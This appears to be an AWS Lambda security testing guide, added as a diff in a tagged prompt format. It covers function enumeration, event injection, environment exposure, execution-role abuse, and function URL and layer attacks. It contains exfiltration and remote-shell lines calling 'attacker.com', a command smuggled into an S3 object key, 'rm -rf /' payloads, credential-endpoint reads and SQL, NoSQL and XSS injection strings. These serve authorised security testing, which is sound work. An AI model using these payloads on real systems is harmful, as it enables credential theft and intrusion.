@@ -1,0 +1,500 @@
+<aws_lambda_security_guide>
+<title>AWS LAMBDA SECURITY TESTING</title>
+
+<critical>AWS Lambda functions are the backbone of serverless architectures. Security vulnerabilities in Lambda can lead to data exposure, privilege escalation, and lateral movement within AWS environments. Testing must cover event injection, environment variable exposure, execution role abuse, and function URL security.</critical>
+
+<scope>
+- Event injection attacks
+- Environment variable exposure
+- Execution role and IAM policy abuse
+- Function URL authentication bypass
+- Cold start exploitation
+- Layer vulnerabilities
+- API Gateway integration issues
+- Code injection and dependencies
+</scope>
+
+<methodology>
+1. Enumerate Lambda functions and their triggers.
+2. Test event handling for injection vulnerabilities.
+3. Examine execution roles for excessive permissions.
+4. Probe function URLs and API Gateway endpoints.
+5. Analyze function code and dependencies for vulnerabilities.
+</methodology>
+
+<function_enumeration>
+<discovery>
+{% raw %}
+# List Lambda functions:
+aws lambda list-functions
+
+# Get function configuration:
+aws lambda get-function-configuration --function-name {function}
+
+# Get function code URL:
+aws lambda get-function --function-name {function}
+
+# List function URLs:
+aws lambda list-function-url-configs --function-name {function}
+
+# List event source mappings:
+aws lambda list-event-source-mappings
+
+# List layers:
+aws lambda list-layers
+{% endraw %}
+</discovery>
+
+<trigger_identification>
+{% raw %}
+# Common Lambda triggers:
+
+# API Gateway:
+# - REST API
+# - HTTP API
+# - WebSocket API
+
+# Other triggers:
+# - S3 events
+# - DynamoDB streams
+# - SQS messages
+# - SNS notifications
+# - CloudWatch Events/EventBridge
+# - Cognito triggers
+# - ALB target groups
+# - Function URLs
+
+# Check resource-based policy:
+aws lambda get-policy --function-name {function}
+{% endraw %}
+</trigger_identification>
+</function_enumeration>
+
+<event_injection>
+<api_gateway_injection>
+{% raw %}
+# API Gateway passes HTTP request as event:
+
+{
+  "httpMethod": "POST",
+  "path": "/users",
+  "body": "{\"user\": \"attacker\"}",
+  "headers": {...},
+  "queryStringParameters": {...},
+  "pathParameters": {...}
+}
+
+# Injection in body:
+{"user": "'; DROP TABLE users; --"}
+{"user": {"$ne": ""}}
+{"user": "<script>alert(1)</script>"}
+
+# Injection in headers:
+X-Forwarded-For: 127.0.0.1
+Host: evil.com
+
+# Path parameters:
+/users/../../etc/passwd
+/users/admin;whoami
+{% endraw %}
+</api_gateway_injection>
+
+<s3_event_injection>
+{% raw %}
+# S3 trigger event structure:
+
+{
+  "Records": [{
+    "s3": {
+      "bucket": {"name": "bucket-name"},
+      "object": {"key": "path/to/object.txt"}
+    }
+  }]
+}
+
+# File name injection:
+# Upload file with malicious name:
+# - ../../../etc/passwd
+# - file.txt; rm -rf /
+# - <script>alert(1)</script>.html
+
+# If Lambda processes file name in shell:
+aws s3 cp payload.txt "s3://bucket/; curl attacker.com/shell | bash #.txt"
+{% endraw %}
+</s3_event_injection>
+
+<sqs_event_injection>
+{% raw %}
+# SQS message event:
+
+{
+  "Records": [{
+    "messageId": "...",
+    "body": "message content",
+    "messageAttributes": {...}
+  }]
+}
+
+# If attacker can send messages to queue:
+aws sqs send-message \
+  --queue-url https://sqs.region.amazonaws.com/account/queue \
+  --message-body '{"command": "rm -rf /"}'
+
+# Test message attributes for injection
+{% endraw %}
+</sqs_event_injection>
+
+<dynamodb_streams>
+{% raw %}
+# DynamoDB stream event:
+
+{
+  "Records": [{
+    "eventName": "INSERT",
+    "dynamodb": {
+      "NewImage": {...},
+      "OldImage": {...}
+    }
+  }]
+}
+
+# Inject malicious data into DynamoDB:
+# Lambda processes it when triggered
+
+# If Lambda trusts stream data for:
+# - Command construction
+# - File paths
+# - SQL queries
+{% endraw %}
+</dynamodb_streams>
+</event_injection>
+
+<environment_exposure>
+<environment_variables>
+{% raw %}
+# Lambda environment variables often contain secrets:
+
+# Common sensitive variables:
+AWS_ACCESS_KEY_ID
+AWS_SECRET_ACCESS_KEY
+AWS_SESSION_TOKEN
+DATABASE_URL
+DB_PASSWORD
+API_KEY
+JWT_SECRET
+ENCRYPTION_KEY
+
+# Get function configuration:
+aws lambda get-function-configuration --function-name {function}
+
+# Environment shown in response:
+{
+  "Environment": {
+    "Variables": {
+      "SECRET_KEY": "actual-secret-value"
+    }
+  }
+}
+{% endraw %}
+</environment_variables>
+
+<exfiltration>
+{% raw %}
+# If code execution in Lambda:
+
+# Read environment:
+import os
+secrets = os.environ
+
+# Read /proc/self/environ:
+cat /proc/self/environ
+
+# Exfiltrate via network:
+curl https://attacker.com/?data=$(cat /proc/self/environ | base64)
+
+# Read Lambda runtime files:
+cat /var/runtime/*
+cat /var/task/*
+{% endraw %}
+</exfiltration>
+</environment_exposure>
+
+<execution_role_abuse>
+<role_enumeration>
+{% raw %}
+# Enumerate Lambda execution role permissions:
+
+# Get function role:
+aws lambda get-function-configuration --function-name {function} \
+  | jq '.Role'
+
+# Analyze role policies:
+aws iam get-role --role-name {role}
+aws iam list-attached-role-policies --role-name {role}
+aws iam list-role-policies --role-name {role}
+aws iam get-role-policy --role-name {role} --policy-name {policy}
+{% endraw %}
+</role_enumeration>
+
+<privilege_escalation>
+{% raw %}
+# Overprivileged Lambda role attacks:
+
+# 1. S3 full access:
+# Read any bucket
+aws s3 ls s3://other-bucket/
+
+# 2. DynamoDB full access:
+# Read/write any table
+aws dynamodb scan --table-name users
+
+# 3. Secrets Manager access:
+# Read other secrets
+aws secretsmanager get-secret-value --secret-id other-secret
+
+# 4. Lambda invoke:
+# Invoke other functions
+aws lambda invoke --function-name admin-function output.json
+
+# 5. IAM permissions:
+# Create roles, attach policies
+aws iam create-role ...
+aws iam attach-role-policy ...
+
+# 6. STS assume-role:
+# Assume other roles
+aws sts assume-role --role-arn arn:aws:iam::account:role/other-role
+{% endraw %}
+</privilege_escalation>
+
+<credential_theft>
+{% raw %}
+# Lambda receives temporary credentials via IMDSv2:
+
+# Inside Lambda:
+# Credentials are in environment variables:
+AWS_ACCESS_KEY_ID
+AWS_SECRET_ACCESS_KEY
+AWS_SESSION_TOKEN
+
+# Or via metadata endpoint (if reachable):
+curl http://169.254.170.2/2018-06-01/credentials
+
+# Use stolen credentials externally:
+export AWS_ACCESS_KEY_ID=AKIA...
+export AWS_SECRET_ACCESS_KEY=xxx
+export AWS_SESSION_TOKEN=xxx
+aws sts get-caller-identity
+{% endraw %}
+</credential_theft>
+</execution_role_abuse>
+
+<function_url_attacks>
+<authentication_bypass>
+{% raw %}
+# Lambda function URLs authentication:
+
+# AuthType: NONE (public)
+# Anyone can invoke
+curl https://xxxxx.lambda-url.region.on.aws/
+
+# AuthType: AWS_IAM (signed requests)
+# Requires SigV4 signing
+# But check for misconfigurations:
+
+# 1. Policy allows unauthenticated:
+{
+  "FunctionUrlAuthType": "AWS_IAM",
+  "Policy": {
+    "Principal": "*",
+    "Action": "lambda:InvokeFunctionUrl"
+  }
+}
+
+# 2. CORS misconfiguration:
+# Allows any origin
+{% endraw %}
+</authentication_bypass>
+
+<url_security>
+{% raw %}
+# Function URL security testing:
+
+# Check authentication type:
+aws lambda get-function-url-config --function-name {function}
+
+# Test without authentication:
+curl https://{url-id}.lambda-url.{region}.on.aws/
+
+# Check CORS:
+curl -H "Origin: https://evil.com" \
+  https://{url-id}.lambda-url.{region}.on.aws/
+
+# Test with malformed requests:
+curl -X POST -d "malformed" https://{url-id}.lambda-url.{region}.on.aws/
+{% endraw %}
+</url_security>
+</function_url_attacks>
+
+<api_gateway_issues>
+<authorization_bypass>
+{% raw %}
+# API Gateway authorization testing:
+
+# Check authorizer configuration:
+aws apigateway get-authorizers --rest-api-id {api-id}
+
+# Test without authorization:
+curl https://{api-id}.execute-api.{region}.amazonaws.com/stage/resource
+
+# Test with invalid token:
+curl -H "Authorization: Bearer invalid" https://{api-url}
+
+# Method/resource authorization:
+# Some methods may have different auth requirements
+{% endraw %}
+</authorization_bypass>
+
+<integration_issues>
+{% raw %}
+# Lambda proxy vs non-proxy integration:
+
+# Proxy integration:
+# Full request passed to Lambda
+# Response must include statusCode, headers, body
+
+# Non-proxy integration:
+# Mapping templates transform request/response
+# Check for injection in templates
+
+# VTL injection (Velocity Template Language):
+$input.body
+$context.identity.sourceIp
+{% endraw %}
+</integration_issues>
+</api_gateway_issues>
+
+<layer_attacks>
+<layer_enumeration>
+{% raw %}
+# List layers:
+aws lambda list-layers
+
+# Get layer version:
+aws lambda get-layer-version --layer-name {layer} --version-number 1
+
+# Download layer code:
+aws lambda get-layer-version --layer-name {layer} --version-number 1 \
+  | jq -r '.Content.Location'
+# Download from returned URL
+{% endraw %}
+</layer_enumeration>
+
+<layer_vulnerabilities>
+{% raw %}
+# Layer security issues:
+
+# 1. Malicious layer:
+# Shared layer contains backdoor
+# Layer modifies function behavior
+
+# 2. Vulnerable dependencies:
+# Layer includes vulnerable libraries
+# Check /opt/ directory in Lambda
+
+# 3. Layer access:
+# Public layers may be abused
+# Cross-account layer access
+
+# Attack: Replace popular layer
+# If layer permission allows, update with malicious code
+{% endraw %}
+</layer_vulnerabilities>
+</layer_attacks>
+
+<cold_start_exploitation>
+<init_phase_attacks>
+{% raw %}
+# Lambda cold start attacks:
+
+# During cold start:
+# - Container initialized
+# - Handler loaded
+# - Init code runs
+
+# Attack init phase:
+# 1. Race conditions during initialization
+# 2. Dependency confusion in package loading
+# 3. Side-channel timing attacks
+
+# Warm instance fingerprinting:
+# /tmp directory persists between invocations
+# Previous execution artifacts may remain
+{% endraw %}
+</init_phase_attacks>
+</cold_start_exploitation>
+
+<common_payloads>
+{% raw %}
+# Event injection:
+{"input": "'; DROP TABLE users; --"}
+{"input": {"$ne": ""}}
+{"path": "../../../etc/passwd"}
+
+# Command injection:
+{"cmd": "; curl attacker.com/shell | bash"}
+{"file": "test.txt; id"}
+
+# Credential theft:
+import os; print(os.environ)
+cat /proc/self/environ
+
+# Environment enumeration:
+aws lambda get-function-configuration --function-name {name}
+
+# Role abuse:
+aws sts get-caller-identity
+aws s3 ls
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate event injection leading to unexpected behavior.
+2. Show environment variable exposure with sensitive data.
+3. Prove execution role abuse for lateral movement.
+4. Document function URL authentication bypass.
+5. Provide reproducible requests with exact payloads.
+</validation>
+
+<false_positives>
+- Properly validated and sanitized event data
+- Minimal execution role permissions (least privilege)
+- Function URL with proper AWS_IAM authentication
+- Environment variables encrypted with KMS
+- VPC-isolated Lambda without internet access
+</false_positives>
+
+<impact>
+- Data breach via environment variable exposure
+- Privilege escalation via execution role abuse
+- Lateral movement within AWS environment
+- Code execution via event injection
+- Credential theft for persistent access
+- Supply chain attacks via layer compromise
+</impact>
+
+<pro_tips>
+1. Always enumerate Lambda execution role permissions.
+2. Check function URLs for authentication type.
+3. Test event injection in all trigger types.
+4. Look for environment variables in function configuration.
+5. Examine layers for vulnerable dependencies.
+6. Test API Gateway authorization at method level.
+7. Check for overprivileged roles with admin actions.
+8. Look for secrets in /tmp from previous executions.
+9. Test cold start behavior for race conditions.
+10. Check resource-based policy for public access.
+</pro_tips>
+
+<remember>Lambda security depends on proper event validation, minimal execution role permissions, and secure configuration. The execution role is the key attack surface - overprivileged roles enable lateral movement across the AWS environment. Always validate and sanitize event data, especially when it influences command construction, file paths, or database queries.</remember>
+</aws_lambda_security_guide>
